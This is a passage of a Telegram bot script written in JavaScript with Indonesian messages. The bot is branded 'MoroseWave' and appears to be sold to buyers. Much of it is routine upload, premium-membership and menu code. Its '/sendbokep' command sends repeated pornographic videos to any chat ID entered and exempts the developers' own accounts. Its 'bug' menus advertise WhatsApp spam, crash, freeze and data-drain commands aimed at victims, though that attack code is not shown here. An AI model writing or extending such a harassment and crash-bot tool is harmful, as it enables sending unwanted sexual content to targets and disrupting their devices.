    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

bot.command("tourl2", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply foto dengan /tourl2");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else {
      return ctx.reply("❌ i.ibb hanya mendukung foto/gambar.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("image", buffer.toString("base64"));

    const uploadRes = await axios.post(
      `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`,
      form,
      { headers: form.getHeaders() }
    );

    const url = uploadRes.data.data.url;
    ctx.reply(`✅ Foto berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ tourl2 error:", err.message);
    ctx.reply("❌ Gagal mengupload foto ke i.ibb.co");
  }
});

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

///=== comand blockcmd ===\\\
// ===============================
// BLOCK CMD GROUP - TELEGRAF
// ===============================

bot.command("blockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /blockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock)
      db.groupCmdBlock = {};

    if (!db.groupCmdBlock[groupId])
      db.groupCmdBlock[groupId] = [];

    // sudah ada
    if (db.groupCmdBlock[groupId].includes(cmd)) {
      return ctx.reply("⚠️ Command sudah diblock.");
    }

    db.groupCmdBlock[groupId].push(cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil block command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});


// ===============================
// UNBLOCK CMD GROUP
// ===============================

bot.command("unblockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /unblockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock?.[groupId]) {
      return ctx.reply("⚠️ Tidak ada command yang diblock.");
    }

    db.groupCmdBlock[groupId] =
      db.groupCmdBlock[groupId].filter(c => c !== cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil unblock command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("listblockcmd", async (ctx) => {
  try {
    const db = loadDB();
    const chatId = String(ctx.chat.id);

    const blocked =
      db.groupCmdBlock?.[chatId] || [];

    if (blocked.length < 1) {
      return ctx.reply(
        "❌ Tidak ada command yang diblock."
      );
    }

    let teks = `📌 LIST BLOCK COMMAND\n\n`;

    blocked.forEach((cmd, i) => {
      teks += `${i + 1}. ${cmd}\n`;
    });

    ctx.reply(teks);

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

const PREM_GROUP_FILE = "./grup.json";

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    // kalau corrupt, reset biar aman
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command("addpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

bot.command("delpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = delPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

const PROTECTED_IDS = new Set([
  "1550001633",
  "8035037851",
]);

const videoList = [
  "https://files.catbox.moe/kusho1.jpg",
  "https://files.catbox.moe/85mjwm.mp4",
  "https://files.catbox.moe/fzzhjm.jpg",
  "https://files.catbox.moe/ec28m8.mp4",
  "https://files.catbox.moe/n3ebuz.mp4",
  "https://files.catbox.moe/qhr4fl.jpg",
  "https://files.catbox.moe/zqaszb.mp4",
  "https://files.catbox.moe/34aa39.mp4",
  "https://files.catbox.moe/dmbizk.mp4",
  "https://files.catbox.moe/wmda7z.mp4",
  "https://files.catbox.moe/kwb2m2.jpg",
  "https://files.catbox.moe/8xye1k.jpg",
  "https://files.catbox.moe/y1osro.mp4",
  "https://files.catbox.moe/2mowo7.jpg",
  "https://files.catbox.moe/o1ipxw.mp4",
  "https://files.catbox.moe/i6335n.mp4",
  "https://files.catbox.moe/73rjgf.jpg",
  "https://files.catbox.moe/3re1pn.jpg",
  "https://files.catbox.moe/sclrvo.jpg",
  "https://files.catbox.moe/l3sra9.jpg",
  "https://files.catbox.moe/vxe9zl.mp4",
  "https://files.catbox.moe/9vtw1i.jpg",
  "https://files.catbox.moe/o1sq2k.mp4",
  "https://files.catbox.moe/y91pkz.jpg",
  "https://files.catbox.moe/0hies4.jpg",
  "https://files.catbox.moe/hnbks1.jpg",
  "https://files.catbox.moe/1a78ht.mp4",
  "https://files.catbox.moe/htcdyl.jpg",
  "https://files.catbox.moe/iajl3r.mp4",
  "https://files.catbox.moe/pamcr7.jpg",
  "https://files.catbox.moe/eti8qi.mp4",
  "https://files.catbox.moe/wgj8vl.mp4",
  "https://files.catbox.moe/83fd5h.mp4",
  "https://files.catbox.moe/k1w8sw.jpg",
  "https://files.catbox.moe/tdqof8.jpg",
  "https://files.catbox.moe/6di4hn.mp4",
  "https://files.catbox.moe/0eisok.mp4",
  "https://files.catbox.moe/e5zkcl.jpg",
];

bot.command("sendbokep", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);

  const targetId = args[0];
  const jumlah = parseInt(args[1]) || 1;

  if (!targetId) {
    return ctx.reply("❌ Format: /sendbokep <chat_id> [jumlah]");
  }

  if (PROTECTED_IDS.has(String(targetId))) {
    return ctx.replyWithHTML(
  `⛔ Pengiriman diblokir: ID <code>${targetId}</code> termasuk dalam daftar terlindungi (developer).`
  );
  }
  
  await ctx.replyWithHTML(
  `Mengirim ${jumlah} video ke ID: <code>${targetId}</code>`
  );

  for (let i = 0; i < jumlah; i++) {
    const randomVideo =
      videoList[Math.floor(Math.random() * videoList.length)];

    try {
      await ctx.telegram.sendVideo(targetId, randomVideo);
    } catch (err) {
      console.error("Gagal kirim video:", err.message);

      return ctx.replyWithHTML(
  `❌ Gagal mengirim video ke ID <code>${targetId}</code>: ${err.message}`
  );
    }
  }

  await ctx.replyWithHTML(
    `✅ Berhasil mengirim ${jumlah} video ke ID: <code>${targetId}</code>`
  );
});

const activePolls = {};

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
        if (ctx.from.id != ownerID && !isAdmin(ctx.from.id)) {
            return ctx.reply("❌ ☇ Akses hanya untuk pemilik dan admin"); 
        }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});



bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

// ======================
// KONFIGURASI WARNA & ICON
// ======================
const userWarna = new Map();

function getStyle(warna) {
    if (warna === 'merah') return 'danger';
    if (warna === 'biru') return 'primary';
    if (warna === 'hijau') return 'success';
    return 'success';
}

function getDiskoStyle() {
    const random = Math.floor(Math.random() * 3);
    if (random === 0) return 'danger';
    if (random === 1) return 'primary';
    return 'success';
}

// List icon ID untuk random
const iconIdsList = [
    "5316556616319905664",  // 😤
    "5440703719752608257",  // 🗡
    "5438166923089029724",  // 🖱
    "5438191043625364502",  // 💀
    "5449806649533411582",  // 💀
    "5330237710655306682",  // 📱
    "5285084633573110315",  // 😱
    "5244968767150109583",  // 💀
    "5208464633215611044",  // ✨
    "5260450573768990626",  // ➡️
    "5334818215967076232", 
    "6309915906877165527",
    "6086730808968614780",
    "6089217174126203362",
    "6086946867298439895",
    "6089124398537642497",
    "6088971806939550947",
    "6093818260921258328",
    "6089079808187174973",
    "6309611273436793918",
    "6307512258494730630",
    "6307696237713822796",
    "6309915906877165527"
];

function getRandomIconId() {
    return iconIdsList[Math.floor(Math.random() * iconIdsList.length)];
}

function createButton(text, callback, funcKey, warna) {
    let style = 'success';
    if (warna === 'disko') {
        style = getDiskoStyle();
    } else {
        style = getStyle(warna);
    }
    const btn = { text, callback_data: callback, style };
    btn.icon_custom_emoji_id = getRandomIconId();
    return btn;
}

function createUrlButton(text, url, funcKey, warna) {
    let style = 'success';
    if (warna === 'disko') {
        style = getDiskoStyle();
    } else {
        style = getStyle(warna);
    }
    const btn = { text, url, style };
    btn.icon_custom_emoji_id = getRandomIconId();
    return btn;
}

const warnaKeyboard = {
    inline_keyboard: [
        [
            { text: "MERAH", callback_data: "warna_merah", style: "danger", icon_custom_emoji_id: "5440703719752608257" },
            { text: "BIRU", callback_data: "warna_biru", style: "primary", icon_custom_emoji_id: "5330237710655306682" }
        ],
        [
            { text: "HIJAU", callback_data: "warna_hijau", style: "success", icon_custom_emoji_id: "5316556616319905664" },
            { text: "DISKO", callback_data: "warna_disko", style: "danger", icon_custom_emoji_id: "5244968767150109583" }
        ]
    ]
};

function getMenuHome(warna) {
    return [
        [
            createButton("◀", "menu_information", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("▶", "menu_homecontrols", 'nav', warna)
        ],
        [
            createUrlButton("𝗧𝗵𝗲 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿𝘀", "https://t.me/Luctadvorisme", 'owner', warna)
        ],
        [
            createButton("𝗚𝗔𝗡𝗧𝗜 𝗪𝗔𝗥𝗡𝗔", "ganti_warna", 'gantiWarna', warna)
        ]
    ];
}

function getMenuControls(warna) {
    return [
        [
            createButton("◀", "menu_home", 'nav', warna),
            createButton("HOME", "menu_home", 'home', warna),
            createButton("▶", "menu_hometoolss", 'nav', warna)
        ],
        [
            createButton("𝗖𝗼𝗻𝘁𝗿𝗼𝗹𝘀", "menu_controls", 'nav', warna)
        ],
        [
            createButton("𝗚𝗔𝗡𝗧𝗜 𝗪𝗔𝗥𝗡𝗔", "ganti_warna", 'gantiWarna', warna)
        ]
    ];
}

function getMenuToolss(warna) {
    return [
        [
            createButton("◀", "menu_controls", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("▶", "menu_homebugs", 'nav', warna)
        ],
        [
            createButton("𝗧𝗼𝗼𝗹𝘀", "menu_toolss", 'nav', warna)
        ],
        [
            createButton("𝗚𝗔𝗡𝗧𝗜 𝗪𝗔𝗥𝗡𝗔", "ganti_warna", 'gantiWarna', warna)
        ]
    ];
}

function getMenuBug(warna) {
    return [
        [
            createButton("◀", "menu_hometoolss", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("▶", "menu_tqto", 'nav', warna)
        ],
        [
            createButton("𝗠𝘂𝗿𝗯𝘂𝗴", "menu_bug", 'nav', warna),
            createButton("𝗧𝗿𝗮𝘀𝗵 𝗕𝘂𝗴", "menu_bug2", 'nav', warna)
        ],
        [
            createButton("𝗚𝗔𝗡𝗧𝗜 𝗪𝗔𝗥𝗡𝗔", "ganti_warna", 'gantiWarna', warna)
        ]
    ];
}

function getMenuTqto(warna) {
    return [
        [
            createButton("◀", "menu_bug", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("▶", "menu_information", 'nav', warna)
        ],
        [
            createButton("𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼", "menu_tqto", 'nav', warna)
        ],
        [
            createButton("𝗚𝗔𝗡𝗧𝗜 𝗪𝗔𝗥𝗡𝗔", "ganti_warna", 'gantiWarna', warna)
        ]
    ];
}

function getMenuInformation(warna) {
    return [
        [
            createButton("◀", "menu_tqto", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("▶", "menu_home", 'nav', warna)
        ],
        [
            createButton("𝗚𝗔𝗡𝗧𝗜 𝗪𝗔𝗥𝗡𝗔", "ganti_warna", 'gantiWarna', warna)
        ]
    ];
}

function getMenuCaption(premiumStatus, name, userId, senderStatus, runtimeStatus, page) {
    return `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

[ STATUS ]
  Premium: ${premiumStatus}
  Name: ${name} (${userId})
  Sender: ${senderStatus}
  Runtime: ${runtimeStatus}
  Guard: Active

[ PAGE ${page}/6 ]
</code></pre>`;
}

// ======================
// START MENU (dengan loading frames)
// ======================
bot.start(async (ctx) => {
  const loadingMessage = await ctx.reply("🤖 <b>MoroseWave Initializing...</b>", {
    parse_mode: "HTML"
  });

  const loadingFrames = [
    { text: "🌊 <b>Wave Detecting...</b>", delay: 300 },
    { text: "🕳️ <b>Entering the Void...</b>", delay: 300 },
    { text: "🕸️ <b>Mapping the Infinity...</b>", delay: 300 },
    { text: "🔥 <b>Igniting The Core...</b>", delay: 300 },
    { text: "🌒 <b>MoroseWave Present</b>", delay: 300 },
    { text: "🌑 <b>Everything is Nothing.</b>", delay: 500 }
  ];

  for (const frame of loadingFrames) {
    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMessage.message_id,
        null,
        frame.text,
        { parse_mode: "HTML" }
      );
      await new Promise(resolve => setTimeout(resolve, frame.delay));
    } catch (error) {
      if (error.response && error.response.error_code === 400) continue;
    }
  }
  
  try {
    await ctx.telegram.deleteMessage(ctx.chat.id, loadingMessage.message_id);
  } catch (error) {}

  const userId = ctx.from.id;
  const isOwner = userId == ownerID;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  const runtimeStatus = formatRuntime();

  if (!isOwner && ctx.chat.type === "private") {
    bot.telegram.sendMessage(ownerID, `User: ${ctx.from.first_name}\nID: ${userId}`);
    return ctx.reply("Bot hanya untuk grup premium.");
  }

  if (userId != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const menuMessage = getMenuCaption(premiumStatus, ctx.from.first_name, userId, senderStatus, runtimeStatus, 1);
  const warna = userWarna.get(userId) || 'hijau';
  const keyboard = getMenuHome(warna);

  ctx.replyWithPhoto(thumbnailUrl, {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: keyboard }
  });
});

// ======================
// ACTION GANTI WARNA
// ======================
bot.action('ganti_warna', async (ctx) => {
    await ctx.editMessageCaption("Pilih warna tema kamu:", {
        parse_mode: "HTML",
        reply_markup: warnaKeyboard
    });
    await ctx.answerCbQuery();
});

bot.action(['warna_merah', 'warna_biru', 'warna_hijau', 'warna_disko'], async (ctx) => {
    let warna = 'hijau';
    if (ctx.match[0] === 'warna_merah') warna = 'merah';
    if (ctx.match[0] === 'warna_biru') warna = 'biru';
    if (ctx.match[0] === 'warna_hijau') warna = 'hijau';
    if (ctx.match[0] === 'warna_disko') warna = 'disko';

    userWarna.set(ctx.from.id, warna);
    await ctx.answerCbQuery(`Warna ${warna.toUpperCase()} dipilih!`);

    const userId = ctx.from.id;
    const premiumStatus = isPremiumUser(userId) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();

    const menuMessage = getMenuCaption(premiumStatus, ctx.from.first_name, userId, senderStatus, runtimeStatus, 1);
    const keyboard = getMenuHome(warna);

    try {
        await ctx.editMessageMedia({ type: 'photo', media: thumbnailUrl, caption: menuMessage, parse_mode: "HTML" }, { reply_markup: { inline_keyboard: keyboard } });
    } catch (error) {
        await ctx.replyWithPhoto(thumbnailUrl, { caption: menuMessage, parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
    }
});

// ======================
// MENU HOME (PAGE 1/6)
// ======================
bot.action('menu_home', async (ctx) => {
    const userId = ctx.from.id;
    const warna = userWarna.get(userId) || 'hijau';
    const premiumStatus = isPremiumUser(userId) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();

    const menuMessage = getMenuCaption(premiumStatus, ctx.from.first_name, userId, senderStatus, runtimeStatus, 1);
    const keyboard = getMenuHome(warna);

    try {
        await ctx.editMessageMedia({ type: 'photo', media: thumbnailUrl, caption: menuMessage, parse_mode: "HTML" }, { reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) await ctx.answerCbQuery();
        else console.error("Error:", error);
    }
});

// ======================
// MENU CONTROLS (PAGE 2/6)
// ======================
bot.action('menu_controls', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';

    const controlsMenu = `
<pre><code class="language-javascript">
[ CONTROLS | v24.0 G2 ]

[ SYSTEM ]
  /addbot - Add Sender
  /setcd - Set Cooldown
  /killsesi - Reset Session

[ USER ]
  /addprem - Add Premium
  /delprem - Delete Premium
  /addpremgrup - Add Group Prem
  /delpremgrup - Delete Group Prem
  /blockcmd - Block Command
  /unblockcmd - Unblock Command
  /listblockcmd - List Blocked

[ PAGE 2/6 ]
</code></pre>`;

    const keyboard = getMenuControls(warna);

    try {
        await ctx.editMessageCaption(controlsMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) await ctx.answerCbQuery();
        else console.error("Error:", error);
    }
});

bot.action('menu_homecontrols', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';

    const controlsMenu = `
<pre><code class="language-javascript">
[ CONTROL PANEL ]

Menu ini digunakan untuk mengontrol dan mengatur bot.
Anda dapat menambah sender, mengatur cooldown, reset session,
serta mengelola user premium dan grup premium.

[ PAGE 2/6 ]
</code></pre>`;

    const keyboard = getMenuControls(warna);

    try {
        await ctx.editMessageCaption(controlsMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) await ctx.answerCbQuery();
        else console.error("Error:", error);
    }
});

// ======================
// MENU TOOLSS (PAGE 3/6)
// ======================
bot.action('menu_toolss', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';

    const toolssMenu = `
<pre><code class="language-javascript">
[ TOOLS | v24.0 G2 ]

[ DEVICE & GEN ]
  /iqc - iPhone Gen
  /sendbokep - Private Tools
  /tiktoksearch - Search TT
  /play - Spotify
  /fixcode - Fix File.Js
  /updatemoro - Update Script

[ MEDIA & DL ]
  /brat - Brat Sticker
  /tiktok - Downloader TT
  /tourl - To Url Media
  /tourl2 - To Url Image
  /fakecall - Foto To Avatar

[ PAGE 3/6 ]
</code></pre>`;

    const keyboard = getMenuToolss(warna);

    try {
        await ctx.editMessageCaption(toolssMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) await ctx.answerCbQuery();
        else console.error("Error:", error);
    }
});

bot.action('menu_hometoolss', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';

    const controlsMenu = `
<pre><code class="language-javascript">
[ TOOLS PANEL ]

Menu ini berisi berbagai tools dan utilitas yang tersedia.
Anda dapat generate device, mencari tiktok, downloader media,
membuat sticker brat, convert media ke url, dan lainnya.

[ PAGE 3/6 ]
</code></pre>`;

    const keyboard = getMenuToolss(warna);

    try {
        await ctx.editMessageCaption(controlsMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) await ctx.answerCbQuery();
        else console.error("Error:", error);
    }
});

// ======================
// MENU BUG (PAGE 4/6)
// ======================
bot.action('menu_bug', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';

    const bugMenu = `
<pre><code class="language-javascript">
[ BUG | v24.0 G2 ]

[ CAN SPAM ]
  /morospam - Delay Invisible
  /morobuldo - Drain Kuota

Note: Nomor Wajib Bisa Chat Agar Tidak Mudah Kena Limit

[ PAGE 4/6 ]
</code></pre>`;

    const keyboard = getMenuBug(warna);

    try {
        await ctx.editMessageCaption(bugMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) await ctx.answerCbQuery();
        else console.error("Error:", error);
    }
});

bot.action('menu_bug2', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';

    const bugMenu2 = `
<pre><code class="language-javascript">
[ TRASH | v24.0 G2 ]

  /moroinvis - DelayHard Invisible
  /moroscreen - Blank Infinity
  /morobeku - Freeze Chat
  /morodrain - Bulldozer

[ PAGE 4/6 ]
</code></pre>`;

    const keyboard = getMenuBug(warna);

    try {
        await ctx.editMessageCaption(bugMenu2, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) await ctx.answerCbQuery();
        else console.error("Error:", error);
    }
});

bot.action('menu_homebugs', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';

    const controlsMenu = `
<pre><code class="language-javascript">
[ BUG PANEL ]

Menu ini berisi kumpulan bug yang tersedia.
Gunakan dengan bijak dan bertanggung jawab.
Setiap command memiliki fungsi yang berbeda-beda.

[ PAGE 4/6 ]
</code></pre>`;

    const keyboard = getMenuBug(warna);

    try {
        await ctx.editMessageCaption(controlsMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) await ctx.answerCbQuery();
        else console.error("Error:", error);
    }
});

// ======================
// MENU TQTO / CREDIT (PAGE 5/6)
// ======================
bot.action('menu_tqto', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';

    const tqtoMenu = `
<pre><code class="language-javascript">
[ CREDIT | v24.0 G2 ]

  @Luctadvorisme (Dev)
  All Buyers & Users

  Everything is Nothing.

[ PAGE 5/6 ]
</code></pre>`;

    const keyboard = getMenuTqto(warna);

    try {
        await ctx.editMessageCaption(tqtoMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) await ctx.answerCbQuery();
        else console.error("Error:", error);
    }
});

bot.action('menu_hometqto', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';

    const controlsMenu = `
<pre><code class="language-javascript">
[ CREDIT PANEL ]

Menu ini menampilkan informasi kredit dan penghargaan.
Terima kasih kepada semua yang telah mendukung project ini.

[ PAGE 5/6 ]
